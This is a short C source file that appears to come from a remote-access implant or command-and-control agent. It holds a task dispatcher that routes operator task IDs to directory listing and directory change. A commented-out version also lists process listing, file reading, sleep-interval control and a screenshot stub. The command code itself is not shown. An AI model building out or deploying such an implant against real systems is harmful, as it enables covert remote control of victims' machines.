//
// Created by j4ck on 3/22/24.
//
#include <windows.h>
#include <string.h>
#include <wchar.h>
#include <stdio.h>
#include "../Include/Agent.h"
#include "../Include/Tasks.h"
#include "../Include/Commands.h"

BOOL TaskController(IN DWORD dwTaskId, IN PCHAR pTaskArgs, OUT PBYTE *pTaskOutput) {
    printf("[+] TaskController\n TaskId: %ld\n TaskArgs: %s\n", dwTaskId, pTaskArgs);
    if (dwTaskId == 1) {
        CommandListDirectory(pTaskArgs, pTaskOutput);
    }
    else if (dwTaskId == 2) {
        CommandChangeDirectory(pTaskArgs);
    }
    return TRUE;
}



/*
BOOL TaskHandler() {
    wprintf(L"[+]TaskHandler() TaskID: %d Args: %s\n", Agent->Config.CurrentTaskId, Agent->Config.CurrentTaskArgs);
    if (Agent->Config.CurrentTaskId == 0x00) {
        return FALSE;
    }
    if (Agent->Config.CurrentTaskId == 0x01) { // List Directory
        CommandListDirectory();
    }
    if (Agent->Config.CurrentTaskId == 0x02) { // Change Directory
        CommandChangeDirectory();
    }
    if (Agent->Config.CurrentTaskId == 0x03) { // List Processes
        CommandListProcesses();
    }
    if (Agent->Config.CurrentTaskId == 0x04) { // Print Working Directory
        CommandPrintWorkingDirectory();
    }
    if (Agent->Config.CurrentTaskId == 0x05) { // Print Working Directory
        CommandCat();
    }
    if (Agent->Config.CurrentTaskId == 0x06) { // Print Working Directory
        Agent->Config.sleep = (_wtoi(Agent->Config.CurrentTaskArgs) * 1000);
    }
    if (Agent->Config.CurrentTaskId == 0x09) { // Screenshot

    }
}


*/